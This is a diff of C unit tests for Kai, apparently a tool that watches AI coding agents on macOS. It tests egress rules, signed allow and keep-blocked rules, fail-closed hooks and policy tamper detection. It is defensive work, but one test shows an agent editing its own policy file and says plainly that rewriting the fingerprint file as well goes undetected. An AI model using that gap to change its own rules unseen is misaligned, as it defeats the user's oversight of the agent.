+    char cmd[800]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+/* Spec §4: GitHub and package registries are optional channels, off by default,
+ * turned on per agent with a "channel <agent>/<channel>" policy line. */
+static void test_channels(void) {
+    printf("no fixed categories (spec v2.1 B.3, B.4): catalog describes, never allows\n");
+    char err[256], why[256], first[64];
+    kai_policy *d = kai_policy_from_string("egress block\n", err, sizeof err);
+    CHECK(d && kai_egress_endpoint_allowed(d, "github.com", "1.2.3.4", 443, why, sizeof why) != 1,
+          "github.com isn't built in");
+    CHECK(d && kai_egress_endpoint_allowed(d, "api.anthropic.com", "1.2.3.4", 443, why, sizeof why) == 1,
+          "model APIs still are");
+    kai_policy_free(d);
+    kai_policy *p = kai_policy_from_string("egress block\nchannel claude/code-hosting\n", err, sizeof err);
+    CHECK(p && kai_policy_unknown(p, first, sizeof first) == 1 && !strcmp(first, "channel"),
+          "a leftover channel line grants nothing and shows as unrecognized");
+    CHECK(p && kai_egress_endpoint_allowed(p, "github.com", "1.2.3.4", 443, why, sizeof why) != 1,
+          "...github.com is still asked about");
+    kai_policy_free(p);
+    const char *group = NULL;
+    const char *desc = kai_host_describe("developerservices2.apple.com", &group);
+    CHECK(desc && strstr(desc, "Apple developer service") && group && !strcmp(group, "Apple development"),
+          "catalog: a plain description and group");
+    CHECK(kai_host_describe("api.github.com", &group) != NULL, "catalog: describes a subdomain of a known service");
+    CHECK(kai_host_describe("unfamiliar.example", &group) == NULL, "catalog: unknown stays unknown");
+    CHECK(kai_host_describe("evilgithub.com", &group) == NULL, "catalog: matches on a dot only");
+    int n = 0;
+    for (const char *h; (h = kai_channel_legacy_host("code-hosting", n)); n++) {}
+    CHECK(n == 5 && !strcmp(kai_channel_legacy_host("code-hosting", 0), "github.com"),
+          "migration list for the old code-hosting switch: 5 exact hosts");
+    CHECK(kai_channel_legacy_host("no-such-switch", 0) == NULL, "...nothing for an unknown switch");
+}
+
+/* Spec v2.1 A.6b: policy integrity, honest scope. Kai records a fingerprint
+ * when it writes the policy; a change by anything else shows as "changed
+ * outside Kai" (unless that something also rewrote the fingerprint: the
+ * stated limit). Malformed, unrecognized and missing are separate states. */
+static void test_policy_integrity(void) {
+    printf("policy integrity (spec v2.1 A.6b)\n");
+    char home[] = "/tmp/kai-integXXXXXX";
+    if (!mkdtemp(home)) { CHECK(0, "mkdtemp"); return; }
+    char cmd[1600], pol[700], fp[700], out[700], err[256], first[64];
+    snprintf(pol, sizeof pol, "%s/policy", home);
+    snprintf(fp, sizeof fp, "%s/policy.sha256", home);
+    snprintf(out, sizeof out, "%s/o.txt", home);
+    #define K(args) (snprintf(cmd, sizeof cmd, "env -u KAI_POLICY KAI_HOME='%s' HOME='%s' tests/cli/kai-test " args " > '%s' 2>&1", home, home, out), system(cmd))
+    CHECK(K("init") == 0 && access(fp, F_OK) == 0, "kai init records the fingerprint");
+    K("doctor");
+    CHECK(file_contains(out, "policy matches what Kai last wrote"), "doctor: unchanged");
+    CHECK(K("policy set on_fetch block") == 0, "a Kai write");
+    K("doctor");
+    CHECK(file_contains(out, "policy matches what Kai last wrote"), "...keeps the fingerprint current");
+
+    FILE *f = fopen(pol, "a"); if (f) { fputs("protect ~/agent-added\n", f); fclose(f); }
+    K("doctor");
+    CHECK(file_contains(out, "changed outside Kai"), "an agent editing the policy file directly: changed outside Kai");
+    K("status");
+    CHECK(file_contains(out, "changed outside Kai"), "...status says so too");
+
+    /* the stated limit: rewrite the fingerprint as well, and it isn't detected */
+    snprintf(cmd, sizeof cmd, "shasum -a 256 '%s' | cut -c1-64 > '%s'", pol, fp); (void)system(cmd);
+    K("doctor");
+    CHECK(!file_contains(out, "changed outside Kai") && file_contains(out, "can't detect a change made together with"),
+          "policy and fingerprint both edited: not detected, and doctor says that's the limit");
+
+    f = fopen(pol, "a"); if (f) { fputs("frobnicate yes\n", f); fclose(f); }
+    kai_policy *p = kai_policy_load(pol, err, sizeof err);
+    CHECK(p && kai_policy_unknown(p, first, sizeof first) == 1 && !strcmp(first, "frobnicate"),
+          "an unrecognized rule is counted, not silently dropped");
+    if (p) kai_policy_free(p);
+    K("doctor");
+    CHECK(file_contains(out, "unrecognized") && file_contains(out, "frobnicate"), "doctor: unrecognized rule, named");
+
+    f = fopen(pol, "a"); if (f) { fputs("rule_upload broken ((\n", f); fclose(f); }
+    K("doctor");
+    CHECK(file_contains(out, "malformed"), "doctor: malformed, its own state");
+
+    unlink(pol);
+    snprintf(cmd, sizeof cmd, "printf '%%s' '{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Read\",\"session_id\":\"i\","
+             "\"tool_input\":{\"file_path\":\"/tmp/readme.txt\"},\"cwd\":\"/tmp\"}' | env -u KAI_POLICY KAI_HOME='%s' HOME='%s' "
+             "tests/cli/kai-test hook claude > '%s' 2>&1", home, home, out);
+    (void)system(cmd);
+    CHECK(file_contains(out, "deny") && file_contains(out, "Kai can't read its rules, so it stopped this action"),
+          "policy missing after Kai wrote it: tool checks fail closed with the doctor hint");
+    snprintf(cmd, sizeof cmd, "printf '%%s' '{\"hook_event_name\":\"UserPromptSubmit\",\"session_id\":\"i\",\"prompt\":\"hi\"}' | "
+             "env -u KAI_POLICY KAI_HOME='%s' HOME='%s' tests/cli/kai-test hook claude > '%s' 2>&1", home, home, out);
+    (void)system(cmd);
+    CHECK(!file_contains(out, "\"decision\"") && file_contains(out, "this prompt wasn't checked"),
+          "...the prompt check warns and allows");
+    K("doctor");
+    CHECK(file_contains(out, "missing"), "doctor: missing");
+    #undef K
+    snprintf(cmd, sizeof cmd, "rm -rf '%s'", home); (void)system(cmd);
+}
+
+/* Migration of the old category switches (correction): a permanent rule only
+ * for a host the agent actually reached (audit evidence), and even then a
+ * 7-day rule until the user confirms with a fresh Touch ID. */
+static void test_switch_migration(void) {
+    printf("switch migration: evidence, 7-day rules, no old Touch ID (spec v2.1 B.4)\n");
+    char saved[1100]; snprintf(saved, sizeof saved, "%s", getenv("KAI_HOME") ? getenv("KAI_HOME") : "");
+    char home[] = "/tmp/kai-migXXXXXX";
+    if (!mkdtemp(home)) { CHECK(0, "mkdtemp"); return; }
+    setenv("KAI_HOME", home, 1);
+    /* what an agent really did: a network block for github.com, a request and a use */
+    audit_one("network", "claude", "block", "not_on_allowlist", "connection to github.com (1.2.3.4:443) is not on the allowlist", "github.com");
+    audit_one("grant", "requested", "request", "connect", "grant requested id=n1 agent=claude egress awaiting approval", "github.com");
+    /* what the earlier migration wrote: never evidence */
+    audit_one("grant", "approved", "sign", "connect", "grant approved id=migration agent=claude rule migrated from the code-hosting switch", "gitlab.com");
+    audit_one("network", "codex", "block", "not_on_allowlist", "connection to bitbucket.org is not on the allowlist", "bitbucket.org");
+    CHECK(kai_migration_evidence("claude", "github.com") == 1, "github.com: Claude Code reached it (audit evidence)");
+    CHECK(kai_migration_evidence("claude", "gitlab.com") == 0, "gitlab.com: only the migration's own record, not evidence");
+    CHECK(kai_migration_evidence("claude", "bitbucket.org") == 0, "bitbucket.org: another agent reached it, not this one");
+    CHECK(kai_migration_evidence("claude", "githubusercontent.com") == 0 &&
+          kai_migration_evidence("claude", "ghcr.io") == 0, "githubusercontent.com, ghcr.io: no evidence");
+    CHECK(kai_migration_evidence("claude", "api.github.com") == 0, "evidence is for the exact host");
+
+    char rdir[700]; snprintf(rdir, sizeof rdir, "%s/rules", home); mkdir(rdir, 0700);
+    const unsigned char key[] = "rules-test-key-0123456789abcdef";
+    const char *claude = "com.anthropic.claude-code (Q6L2SF6YDW)";
+    long long now = (long long)time(NULL);
+    char id[40];
+    char *m = kai_rule_build_json_migrated("m1", claude, "claude", "github.com", KAI_OP_CONNECT, now, now + 7 * 86400,
+                                           key, sizeof key - 1);
+    CHECK(m != NULL, "a migrated rule: 7 days, no owner authentication carried over");
+    write_rule(rdir, "m1", m);
+    kai_decision_rule r;
+    CHECK(m && kai_rule_from_json(m, &r) && r.migrated == 1 && r.authenticated == 0, "...marked migrated, not authenticated");
+    free(m);
+    CHECK(kai_rule_lookup(rdir, claude, "github.com", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == KAI_RULE_ALLOW,
+          "...allows until it ends");
+    CHECK(kai_rule_build_json_migrated("m2", claude, "claude", "github.com", KAI_OP_CONNECT, now, now + 8 * 86400,
+                                       key, sizeof key - 1) == NULL, "a migrated rule can't last longer than 7 days");
+    CHECK(kai_rule_build_json_migrated("m3", claude, "claude", "github.com", KAI_OP_CONNECT, now, 0,
+                                       key, sizeof key - 1) == NULL, "...or be permanent");
+    m = kai_rule_build_json_migrated("m4", claude, "claude", "gitlab.com", KAI_OP_CONNECT, now - 8 * 86400, now - 86400,
+                                     key, sizeof key - 1);
+    write_rule(rdir, "m4", m); free(m);
+    CHECK(kai_rule_lookup(rdir, claude, "gitlab.com", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "an unconfirmed migrated rule stops after 7 days");
+    /* tampering: flip "migrated" off to pass it as a normal rule */
+    m = kai_rule_build_json_migrated("m5", claude, "claude", "ghcr.io", KAI_OP_CONNECT, now, now + 7 * 86400, key, sizeof key - 1);
+    char *t = m ? strstr(m, "\"migrated\":1") : NULL;
+    if (t) t[11] = '0';
+    write_rule(rdir, "m5", m); free(m);
+    CHECK(kai_rule_lookup(rdir, claude, "ghcr.io", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "an edited migrated flag doesn't verify");
+    char cmd[800]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", home); (void)system(cmd);
+    setenv("KAI_HOME", saved, 1);
+}
+
+/* "Working": a tool call in progress (PreToolUse seen, PostToolUse not yet),
+ * or an event in the last 15 minutes. */
+static void test_working_inflight(void) {
+    printf("working = a call in progress or an event in 15 min\n");
+    long long now = (long long)time(NULL);
+    const char *sid = "test-inflight-1";
+    kai_session_activity_touch(sid, NULL, now - 25 * 60);   /* last event 25 min ago */
+    kai_session_inflight_set(sid, now - 25 * 60);            /* a long command started then */
+    CHECK(kai_session_busy(sid, now) == 1, "a long-running command keeps the session working past 15 minutes");
+    CHECK(kai_session_last_active(sid, NULL) == now - 25 * 60 && !kai_session_working(now - 25 * 60, now),
+          "...although its last event alone would say idle");
+    kai_session_inflight_set(sid, 0);                        /* PostToolUse */
+    CHECK(kai_session_busy(sid, now) == 0, "after PostToolUse, no longer in progress");
+    kai_session_inflight_set(sid, now - 7 * 3600);
+    CHECK(kai_session_busy(sid, now) == 0, "a call left in progress for over 6 hours (agent crashed) doesn't count");
+    kai_session_activity_touch(sid, NULL, now - 60);
+    CHECK(kai_session_working(kai_session_last_active(sid, NULL), now), "an event a minute ago: working");
+}
+
+/* The value line's "Most: <item>, N times": today's most repeated stopped
+ * item, from the log (exact, not the app's buffer); telemetry, kept-blocked,
+ * QUIC and grant records never count. */
+static void test_daily_top(void) {
+    printf("value line: today's most repeated item\n");
+    char dir[] = "/tmp/kai-topXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    char log[700]; snprintf(log, sizeof log, "%s/audit.log", dir);
+    char ts[32]; time_t now = time(NULL); struct tm tmv; gmtime_r(&now, &tmv);
+    strftime(ts, sizeof ts, "%Y-%m-%dT%H:%M:%SZ", &tmv);
+    char top[256]; int n = -1;
+    FILE *f = fopen(log, "w"); if (f) fclose(f);
+    CHECK(kai_daily_top_in(log, top, sizeof top, &n) == 0 && n == 0, "nothing stopped: no top item");
+    f = fopen(log, "w");
+    for (int i = 0; f && i < 16; i++)
+        fprintf(f, "{\"ts\":\"%s\",\"source\":\"network\",\"event\":\"claude\",\"decision\":\"block\",\"rule\":\"not_on_allowlist\","
+                   "\"detail\":\"connection to registry.npmjs.org is not on the allowlist\",\"target\":\"registry.npmjs.org\"}\n", ts);
+    for (int i = 0; f && i < 3; i++)
+        fprintf(f, "{\"ts\":\"%s\",\"source\":\"network\",\"event\":\"cursor\",\"decision\":\"block\",\"rule\":\"not_on_allowlist\","
+                   "\"detail\":\"connection to example.org\",\"target\":\"example.org\"}\n", ts);
+    for (int i = 0; f && i < 40; i++)
+        fprintf(f, "{\"ts\":\"%s\",\"source\":\"network\",\"event\":\"claude\",\"decision\":\"block\",\"rule\":\"not_on_allowlist\","
+                   "\"detail\":\"telemetry to sentry.io (1.1.1.1:443); not asked about\",\"target\":\"sentry.io\"}\n", ts);
+    for (int i = 0; f && i < 30; i++)
+        fprintf(f, "{\"ts\":\"2001-01-01T00:00:00Z\",\"source\":\"network\",\"event\":\"claude\",\"decision\":\"block\","
+                   "\"rule\":\"x\",\"detail\":\"old\",\"target\":\"old.example\"}\n");
+    if (f) fclose(f);
+    CHECK(kai_daily_top_in(log, top, sizeof top, &n) == 1 && !strcmp(top, "registry.npmjs.org") && n == 16,
+          "registry.npmjs.org, 16 times (telemetry and other days never count)");
+    char cmd[800]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+/* Release batch: session topics skip placeholders and markup (8). */
+static void test_topic_clean(void) {
+    printf("session topics: the first real sentence\n");
+    char t[160];
+    kai_topic_clean("<pasted_content id=\"x\">\nsecret stuff\n</pasted_content>\nFix the login bug. Then deploy.", t, sizeof t);
+    CHECK(!strcmp(t, "Fix the login bug."), "placeholder block skipped; first real sentence");
+    kai_topic_clean("<\\pasted_content id=\"ad69\">\n", t, sizeof t);
+    CHECK(t[0] == '\0', "only a placeholder: empty (the UI uses the project name)");
+    kai_topic_clean("[Pasted text #1 +40 lines]\n\n   \nWhy does the build fail?", t, sizeof t);
+    CHECK(!strcmp(t, "Why does the build fail?"), "[Pasted text] lines skipped");
+    kai_topic_clean("<system-reminder>x</system-reminder>\n<command-name>/review</command-name>", t, sizeof t);
+    CHECK(t[0] == '\0', "markup only: empty");
+    kai_topic_clean("Rename the **user** table and update the tests", t, sizeof t);
+    CHECK(!strcmp(t, "Rename the user table and update the tests"), "markdown emphasis removed");
+}
+
+/* Release batch: Codex's documented analytics switch (11). */
+static void test_codex_analytics(void) {
+    printf("Codex: analytics.enabled = false\n");
+    char d[] = "/tmp/kai-cxXXXXXX";
+    if (!mkdtemp(d)) { CHECK(0, "mkdtemp"); return; }
+    char cfg[700], bak[760];
+    snprintf(cfg, sizeof cfg, "%s/config.toml", d);
+    snprintf(bak, sizeof bak, "%s.kai-bak", cfg);
+    FILE *f = fopen(cfg, "w"); if (f) { fputs("model = \"gpt-5\"\n[hooks]\nx = 1\n", f); fclose(f); }
+    CHECK(kai_codex_analytics_off_at(cfg, 0) == 0, "analytics not off yet");
+    CHECK(kai_codex_analytics_off_at(cfg, 1) == 1 && kai_codex_analytics_off_at(cfg, 0) == 1, "turned off");
+    CHECK(file_contains(cfg, "[analytics]") && file_contains(cfg, "enabled = false") && file_contains(cfg, "model = \"gpt-5\"")
+          && access(bak, F_OK) == 0, "...as an [analytics] table, the rest kept, original backed up");
+    CHECK(kai_codex_analytics_off_at(cfg, 1) == 1, "running it again changes nothing");
+    f = fopen(cfg, "w"); if (f) { fputs("[analytics]\nenabled = true\n", f); fclose(f); }
+    CHECK(kai_codex_analytics_off_at(cfg, 1) == 1 && file_contains(cfg, "enabled = false") && !file_contains(cfg, "enabled = true"),
+          "enabled = true becomes false");
+    f = fopen(cfg, "w"); if (f) { fputs("analytics = { enabled = true }\n", f); fclose(f); }
+    CHECK(kai_codex_analytics_off_at(cfg, 1) == -2 && file_contains(cfg, "{ enabled = true }"),
+          "a form Kai doesn't edit safely: refused, unchanged");
+    char cmd[800]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", d); (void)system(cmd);
+    CHECK(kai_host_is_telemetry("metrics.cursor.sh"), "Cursor's metrics host is telemetry");
+}
+
+/* Release batch 16: screen and app control allows are per app, and the app's
+ * Remove takes one away. */
+static void test_capture_grants(void) {
+    printf("screen and app control: per-app allows\n");
+    char d[] = "/tmp/kai-capXXXXXX";
+    if (!mkdtemp(d)) { CHECK(0, "mkdtemp"); return; }
+    const char *old = getenv("KAI_HOME");
+    char saved[1024] = "";
+    if (old) snprintf(saved, sizeof saved, "%s", old);
+    setenv("KAI_HOME", d, 1);
+    long long now = (long long)time(NULL);
+    CHECK(kai_cli_grant_add(1, "capture", "claude", "Safari", NULL, now + 900, NULL, NULL, 0) == 0, "allow Safari");
+    CHECK(kai_cli_grant_allows("capture", "claude", "safari", NULL, NULL, now), "covers Safari, any case");
+    CHECK(!kai_cli_grant_allows("capture", "claude", "Music", NULL, NULL, now), "not another app");
+    CHECK(!kai_cli_grant_allows("capture", "codex", "Safari", NULL, NULL, now), "not another agent");
+    CHECK(!kai_cli_grant_allows("capture", "claude", "Safari", NULL, NULL, now + 901), "ends when it says");
+    CHECK(kai_cli_grant_remove("capture", "claude", "SAFARI") == 0, "Remove takes it away");
+    CHECK(!kai_cli_grant_allows("capture", "claude", "Safari", NULL, NULL, now), "...and it no longer applies");
+    CHECK(kai_cli_grant_remove("capture", "claude", "Safari") == -1, "removing it again: nothing to remove");
+    CHECK(kai_capture_app_is_terminal("Terminal") && kai_capture_app_is_terminal("iTerm2") &&
+          kai_capture_app_is_terminal("Warp") && kai_capture_app_is_terminal("Ghostty") &&
+          kai_capture_app_is_terminal("System Events") && !kai_capture_app_is_terminal("Safari"),
+          "terminals and System Events are terminal-class; Safari isn't");
+    CHECK(kai_cli_grant_add(1, "capture", "claude", "Terminal", NULL, now + 3600, NULL, NULL, 0) == 0 &&
+          kai_cli_grant_until("capture", "claude", "terminal", now) == now + 3600, "an allow's end is read back");
+    const char *cmd1 = "osascript -e 'tell application \"Terminal\" to do script \"make\"'";
+    CHECK(kai_cli_grant_add(1, "exact", "claude", "osascript -e 'tell application \"Terminal\" to do script \"make\"'",
+                            "terminal_control", now + 900, NULL, NULL, 0) == 0, "an exact-command allow for 15 minutes");
+    CHECK(kai_cli_command_granted("claude", "terminal_control", cmd1, KAI_TERMINAL_ALLOW_MAX, now), "...covers that command");
+    CHECK(!kai_cli_command_granted("claude", "terminal_control", "osascript -e 'tell application \"Terminal\" to do script \"rm\"'",
+                                   KAI_TERMINAL_ALLOW_MAX, now), "...not another one");
+    CHECK(!kai_cli_command_granted("claude", "screen_app_control", cmd1, KAI_TERMINAL_ALLOW_MAX, now), "...nor another rule");
+    CHECK(kai_cli_grant_add(1, "exact", "codex", "osascript *", "terminal_control", now + 3600, NULL, NULL, 0) == 0 &&
+          !kai_cli_command_granted("codex", "terminal_control", cmd1, KAI_TERMINAL_ALLOW_MAX, now),
+          "an exact-command allow longer than 15 minutes is ignored for Terminal");
+    char app[64], what[96];
+    CHECK(kai_capture_match("osascript -e 'tell application \"Google Chrome\" to activate'", what, sizeof what, app, sizeof app)
+          && !strcmp(app, "Google Chrome") && !strcmp(what, "control Google Chrome"), "the told app is named as written");
+    CHECK(kai_capture_tool("mcp__computer-use__screenshot", what, sizeof what, app, sizeof app) && !strcmp(app, "computer-use"),
+          "a tool is named by its MCP server");
+    if (saved[0]) setenv("KAI_HOME", saved, 1); else unsetenv("KAI_HOME");
+    char cmd[800]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", d); (void)system(cmd);
+}
+
+/* Release batch: today's redactions per chat site (10). */
+static void test_chat_site_today(void) {
+    printf("chats: today's redactions per site\n");
+    char d[] = "/tmp/kai-chXXXXXX";
+    if (!mkdtemp(d)) { CHECK(0, "mkdtemp"); return; }
+    char log[700]; snprintf(log, sizeof log, "%s/audit.log", d);
+    char ts[32]; time_t now = time(NULL); struct tm tmv; gmtime_r(&now, &tmv);
+    strftime(ts, sizeof ts, "%Y-%m-%dT%H:%M:%SZ", &tmv);
+    FILE *f = fopen(log, "w");
+    for (int i = 0; f && i < 3; i++)
+        fprintf(f, "{\"ts\":\"%s\",\"source\":\"browser\",\"event\":\"claude.ai\",\"decision\":\"redact\",\"rule\":\"prompt\",\"detail\":\"x\"}\n", ts);
+    if (f) fprintf(f, "{\"ts\":\"%s\",\"source\":\"browser\",\"event\":\"chatgpt.com\",\"decision\":\"block\",\"rule\":\"prompt\",\"detail\":\"x\"}\n", ts);
+    if (f) fprintf(f, "{\"ts\":\"%s\",\"source\":\"browser\",\"event\":\"claude.ai\",\"decision\":\"warn\",\"rule\":\"prompt\",\"detail\":\"sent anyway\"}\n", ts);
+    if (f) fprintf(f, "{\"ts\":\"2001-01-01T00:00:00Z\",\"source\":\"browser\",\"event\":\"claude.ai\",\"decision\":\"redact\",\"rule\":\"prompt\",\"detail\":\"x\"}\n");
+    if (f) fclose(f);
+    CHECK(kai_daily_site_in(log, "claude.ai") == 3, "claude.ai: 3 redacted before sending today (not the old one, not sent-anyway)");
+    CHECK(kai_daily_site_in(log, "chatgpt.com") == 1, "chatgpt.com: 1 held");
+    CHECK(kai_daily_site_in(log, "gemini.google.com") == 0, "a site with none: 0");
+    char cmd[800]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", d); (void)system(cmd);
+}
+
+static void test_claude_env(void) {
+    printf("Claude Code env switch (telemetry off)\n");
+    char dir[] = "/tmp/kai-envXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    const char *oldhome = getenv("HOME");
+    char saved[1024]; snprintf(saved, sizeof saved, "%s", oldhome ? oldhome : "");
+    setenv("HOME", dir, 1);
+    char cdir[700], sp[760], bak[800], cmd[1200];
+    snprintf(cdir, sizeof cdir, "%s/.claude", dir); mkdir(cdir, 0700);
+    snprintf(sp, sizeof sp, "%s/settings.json", cdir);
+    snprintf(bak, sizeof bak, "%s.kai-bak", sp);
+    FILE *f = fopen(sp, "w");
+    if (f) { fputs("{\"hooks\":{\"Stop\":[]},\"env\":{\"FOO\":\"1\"},\"model\":\"x\"}", f); fclose(f); }
+    CHECK(!kai_claude_env_is("DISABLE_TELEMETRY", "1"), "not set before");
+    CHECK(kai_claude_set_env("DISABLE_TELEMETRY", "1") == 0, "set it");
+    CHECK(kai_claude_env_is("DISABLE_TELEMETRY", "1"), "...and it reads back");
+    CHECK(file_contains(sp, "\"FOO\"") && file_contains(sp, "\"hooks\"") && file_contains(sp, "\"model\""),
+          "the rest of the settings is kept");
+    CHECK(access(bak, F_OK) == 0 && !file_contains(bak, "DISABLE_TELEMETRY"), "the original is kept as .kai-bak");
+    f = fopen(sp, "w");
+    if (f) { fputs("{ not json", f); fclose(f); }
+    CHECK(kai_claude_set_env("DISABLE_TELEMETRY", "1") == 3 && file_contains(sp, "{ not json"),
+          "invalid settings: refused, unchanged");
+    setenv("HOME", saved, 1);
+    snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+static void test_decision_rules(void) {
+    printf("persistent decisions: identity + destination (B2)\n");
+    char dir[] = "/tmp/kai-rulesXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    const unsigned char key[] = "rules-test-key-0123456789abcdef";
+    const unsigned char other[] = "another-macs-key-0123456789abcd";
+    const char *claude = "com.anthropic.claude-code (Q6L2SF6YDW)";
+    const char *cursor = "com.todesktop.230313mzl4w4u92 (VDXQ22DGB9)";
+    char id[40];
+
+    CHECK(kai_rule_lookup(dir, claude, "up.example.net", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "no rules: nothing matches");
+    CHECK(kai_rule_build_json("a1", KAI_RULE_ALLOW, claude, "claude", "up.example.net", KAI_OP_CONNECT,
+                              1000, 0, key, sizeof key - 1) == NULL,
+          "an Allow rule needs owner authentication");
+    CHECK(kai_rule_build_json("a2", KAI_RULE_ALLOW, claude, "claude", "203.0.113.5:443", KAI_OP_CONNECT,
+                              1000, 1, key, sizeof key - 1) == NULL,
+          "no Allow rule from an address with no known hostname");
+    CHECK(kai_rule_build_json("a3", KAI_RULE_ALLOW, "", "claude", "up.example.net", KAI_OP_CONNECT,
+                              1000, 1, key, sizeof key - 1) == NULL,
+          "no rule without a verified identity");
+
+    char *kb = kai_rule_build_json("kb1", KAI_RULE_KEEP_BLOCKED, claude, "claude", "up.example.net",
+                                   KAI_OP_CONNECT, 1000, 0, key, sizeof key - 1);
+    CHECK(kb != NULL, "Keep blocked needs no authentication");
+    write_rule(dir, "kb1", kb);
+    free(kb);
+    CHECK(kai_rule_lookup(dir, claude, "UP.example.net", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id)
+              == KAI_RULE_KEEP_BLOCKED && !strcmp(id, "kb1"),
+          "Keep blocked is remembered for this agent and destination");
+    CHECK(kai_rule_lookup(dir, cursor, "up.example.net", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "...not for another agent");
+    CHECK(kai_rule_lookup(dir, claude, "down.example.net", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "...not for another destination");
+    CHECK(kai_rule_lookup(dir, claude, "x.up.example.net", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "...not for a subdomain (exact match)");
+    CHECK(kai_rule_lookup(dir, "", "up.example.net", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "an unverified process matches no rule");
+
+    char *al = kai_rule_build_json("al1", KAI_RULE_ALLOW, cursor, "cursor", "api.example.org", KAI_OP_CONNECT,
+                                   1000, 1, key, sizeof key - 1);
+    CHECK(al != NULL, "an authenticated Allow rule for a hostname is built");
+    write_rule(dir, "al1", al);
+    CHECK(kai_rule_lookup(dir, cursor, "api.example.org", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id)
+              == KAI_RULE_ALLOW, "the Allow rule matches its agent and host");
+    CHECK(kai_rule_lookup(dir, claude, "api.example.org", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "...and binds to that agent's identity only");
+    CHECK(kai_rule_lookup(dir, cursor, "api.example.org", KAI_OP_CONNECT, other, sizeof other - 1, id, sizeof id) == 0,
+          "a rule signed on another Mac (another key) is ignored");
+
+    /* tampering: move the Allow to another host */
+    char *t = al ? strdup(al) : NULL;
+    char *at = t ? strstr(t, "api.example.org") : NULL;
+    if (at) memcpy(at, "evl", 3);
+    write_rule(dir, "al1", t);
+    CHECK(kai_rule_lookup(dir, cursor, "evl.example.org", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "an edited rule doesn't verify");
+    free(t);
+    write_rule(dir, "al1", al);
+
+    /* an Allow and a Keep blocked for the same thing: the tighter one wins */
+    char *kb2 = kai_rule_build_json("kb2", KAI_RULE_KEEP_BLOCKED, cursor, "cursor", "api.example.org",
+                                    KAI_OP_CONNECT, 1001, 0, key, sizeof key - 1);
+    write_rule(dir, "kb2", kb2);
+    free(kb2);
+    CHECK(kai_rule_lookup(dir, cursor, "api.example.org", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id)
+              == KAI_RULE_KEEP_BLOCKED, "Keep blocked wins over an Allow");
+    free(al);
+
+    CHECK(!strcmp(kai_wall_state_word(KAI_WALL_OS_ON, 2), "protecting")
+              && !strcmp(kai_wall_state_word(KAI_WALL_OS_ON, 1), "watching")
+              && !strcmp(kai_wall_state_word(KAI_WALL_OS_ON, -1), "unhealthy")
+              && !strcmp(kai_wall_state_word(KAI_WALL_OS_STARTING, 2), "starting")
+              && !strcmp(kai_wall_state_word(KAI_WALL_OS_NOT_INSTALLED, -1), "not installed")
+              && !strcmp(kai_wall_state_word(KAI_WALL_OS_FAILED, 2), "unhealthy"),
+          "wall states: never \"protecting\" without a verified heartbeat (B3)");
+    CHECK(kai_agent_profile_allows("cursor", "auth.grok.com") && kai_agent_profile_allows("cursor", "x.workoscdn.com")
+              && !kai_agent_profile_allows("claude", "auth.grok.com") && !kai_agent_profile_allows("cursor", "grok.com")
+              && !kai_agent_profile_allows("cursor", "evilauth.grok.com"),
+          "agent profiles: Cursor's sign-in hosts for Cursor only, not the chat site");
+    {   /* fix 5: hosts added from observed traffic are flagged for review */
+        const char *pa, *ph; int doc, i, seen_obs = 0, seen_doc = 0, workos_doc = -1;
+        for (i = 0; kai_agent_profile_host(i, &pa, &ph, &doc); i++) {
+            if (doc) seen_doc = 1; else seen_obs = 1;
+            if (!strcmp(ph, "workoscdn.com")) workos_doc = doc;
+        }
+        CHECK(i > 0 && seen_doc && seen_obs && workos_doc == 0,
+              "profiles list each host; workoscdn.com is marked observed, not documented");
+    }
+    CHECK(kai_host_is_telemetry("sentry.io") && kai_host_is_telemetry("o4507.ingest.us.sentry.io")
+              && kai_host_is_telemetry("http-intake.logs.us5.datadoghq.com"),
+          "telemetry hosts are recognized");
+    CHECK(!kai_host_is_telemetry("notsentry.io") && !kai_host_is_telemetry("api.anthropic.com")
+              && !kai_host_is_telemetry(NULL), "...and nothing else");
+
+    char ident[200];
+    CHECK(kai_pid_code_identity(1, ident, sizeof ident) == 1 && strstr(ident, "(Apple)") != NULL,
+          "launchd's verified identity is Apple's");
+    CHECK(kai_pid_code_identity(-1, ident, sizeof ident) == 0 && ident[0] == '\0',
+          "no process: no identity");
+
+    char cmd[700]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
 static void test_endpoint_grants(void) {
     printf("endpoint grants: no grant = no connection (security fix)\n");
     char dir[] = "/tmp/kai-egrantXXXXXX";
@@ -1894,48 +2753,46 @@ static void test_endpoint_grants(void) {
     char cmd[700]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
 }
 
-static void test_control_service(void) {
-    printf("one control path: service apply (Step 3)\n");
-    char err[256], msg[600];
-
-    /* policy store is narrower than control store: registry excluded */
-    char rp[1300];
-    CHECK(kai_path_is_policy_store(kai_policy_file()) == 1, "policy file is in the policy store");
-    snprintf(rp, sizeof rp, "%s/grants/x.json", getenv("KAI_HOME"));
